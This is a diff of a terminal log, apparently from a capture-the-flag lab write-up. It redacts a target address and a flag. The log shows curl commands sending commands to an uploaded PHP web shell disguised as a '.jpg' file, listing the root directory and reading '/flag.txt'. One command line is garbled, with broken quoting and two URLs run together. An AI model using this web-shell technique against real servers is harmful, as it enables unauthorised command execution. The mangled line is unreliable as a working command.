@@ -36,9 +36,9 @@ drwxr-xr-x   1 root root 4096 Aug 19  2020 var
 └─$ 
                                                                                                                                                                                                                                                                                                                            
 ┌──(eredacted)-[~/Desktop]
-└─$ curl "http://redactedprofile_images/shell.phar::.jpg?cmd=c"a"tcurl "http://83.136.251.68:53279/profile_images/shell.phar::.jpg?cmd=ls+/+-la"+/+-flag.txt"
+└─$ curl "http://redactedprofile_images/shell.phar::.jpg?cmd=c"a"tcurl "http://redacted/profile_images/shell.phar::.jpg?cmd=ls+/+-la"+/+-flag.txt"
                                                                                                                                                             
 ┌──(redacted-[~/Desktop]
 └─$ curl "http://redacted/profile_images/shell.phar::.jpg?cmd=cat+/flag.txt"
-HTB{redacted}
+flag{redacted}
 
